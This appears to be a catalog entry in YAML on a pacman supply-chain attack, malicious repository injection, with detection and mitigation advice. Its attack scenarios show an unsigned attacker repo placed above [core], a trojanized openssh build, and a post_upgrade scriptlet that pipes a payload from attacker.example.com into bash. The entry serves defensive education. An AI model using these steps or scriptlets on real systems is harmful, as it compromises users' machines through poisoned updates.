---
name: "Malicious Repository Injection"
packageManager: "pacman"
slug: "pacman-malicious-repo"
category: "Configuration Abuse"
severity: "high"
platform:
  - "Linux"
description: "Pacman resolves packages by searching repositories in the order they are listed in pacman.conf. An attacker who can add a custom repository above the official ones — or who compromises an existing third-party repository — can serve malicious versions of common packages. When the victim runs pacman -Syu, pacman will prefer the attacker's version if the repository appears first or has a higher version number, replacing legitimate system packages with trojanized ones."
prerequisites:
  - "Ability to modify /etc/pacman.conf to add a repository (requires root or compromised config management)"
  - "Or the victim has been convinced to add a third-party repository (e.g., via a tutorial or install script)"
  - "An attacker-controlled server hosting a valid pacman repository database and packages"
attackScenarios:
  - title: "Injecting a Higher-Priority Malicious Repository"
    description: "An attacker adds a custom repository above [core] in pacman.conf. Because pacman searches repositories top-down, the attacker's repository takes priority. The attacker then serves a trojanized version of a common package (e.g., openssh) with a higher epoch or version number."
    commands:
      - label: "Malicious entry added to /etc/pacman.conf (above [core])"
        code: |
          # Attacker adds this above the official repos
          [community-extra]
          SigLevel = Optional TrustAll
          Server = https://attacker.example.com/$repo/$arch

          [core]
          Include = /etc/pacman.d/mirrorlist
        language: "ini"
      - label: "Building a malicious repo with repo-add"
        code: |
          # Attacker creates a trojanized openssh package with a higher epoch
          # to ensure it replaces the official version
          mkdir -p repo/x86_64

          # Build package with epoch bump
          # In PKGBUILD: epoch=99, pkgver=9.9p1, with malicious .install scriptlet
          makepkg -s

          # Create the repo database
          repo-add repo/x86_64/community-extra.db.tar.gz \
              openssh-99:9.9p1-1-x86_64.pkg.tar.zst

          # Serve via web server
          cd repo && python -m http.server 8080
        language: "bash"
      - label: "Victim updates and gets the trojanized package"
        code: |
          pacman -Syu
          # pacman finds openssh in community-extra first (higher epoch)
          # Installs the attacker's version, replacing the legitimate one
        language: "bash"
  - title: "Trojanized Install Script in Unofficial Repository"
    description: "Many Arch-based distribution guides instruct users to add third-party repos for specific software. An attacker creates a legitimate-looking repository hosting useful packages, then later pushes an update with a malicious install scriptlet to an existing package."
    commands:
      - label: "Innocent-looking instructions to add the repo"
        code: |
          # From a convincing blog post or forum reply:
          # "Add our repo for the latest builds:"
          echo '[cool-builds]
          SigLevel = Optional TrustAll
          Server = https://repo.cool-builds.example.com/$arch' | \
              sudo tee -a /etc/pacman.conf
          sudo pacman -Sy
        language: "bash"
      - label: "Later, a package update includes a malicious scriptlet"
        code: |
          # Months later, a "routine update" to the package includes:
          post_upgrade() {
              curl -s https://attacker.example.com/payload | bash
          }
          # The victim gets it on next -Syu
        language: "bash"
detection:
  - title: "Audit pacman.conf for unofficial repositories"
    description: "Regularly review configured repositories and ensure only trusted sources are present."
    commands:
      - code: |
          # List all configured repositories
          grep -E '^\[' /etc/pacman.conf | grep -v '^\[options\]'
          # Expected: [core], [extra], [multilib] only
          # Any other entries should be investigated
        language: "bash"
  - title: "Check which repository provides each installed package"
    description: "Identify packages that were installed from non-official repositories."
    commands:
      - code: |
          # List packages not from official repos
          pacman -Qm
          # Shows all foreign packages (AUR, custom repos, manual installs)

          # Check which repo a specific package came from
          pacman -Si openssh | grep Repository
        language: "bash"
  - title: "Monitor pacman.conf for changes"
    description: "Use inotifywait or file integrity monitoring to detect modifications to pacman configuration."
    commands:
      - code: |
          # Watch for changes to pacman configuration
          inotifywait -m -e modify /etc/pacman.conf /etc/pacman.d/mirrorlist
        language: "bash"
mitigation:
  - "Only add repositories maintained by trusted parties; verify their GPG signing keys"
  - "Never use SigLevel = Optional TrustAll or SigLevel = Never for any repository"
  - "Audit /etc/pacman.conf regularly and track it in version control or configuration management"
  - "Use pacman -Qm to review all foreign (non-official-repo) packages"
  - "Prefer the official repositories and AUR over ad-hoc third-party repos"
  - "Monitor for unexpected epoch bumps or version changes during updates with pacman -Syu --print"
references:
  - title: "Arch Wiki - Official repositories"
    url: "https://wiki.archlinux.org/title/Official_repositories"
  - title: "Arch Wiki - Unofficial user repositories"
    url: "https://wiki.archlinux.org/title/Unofficial_user_repositories"
  - title: "Arch Wiki - Pacman - Repositories and mirrors"
    url: "https://wiki.archlinux.org/title/Pacman#Repositories_and_mirrors"
created: 2026-04-14
updated: 2026-04-14
---
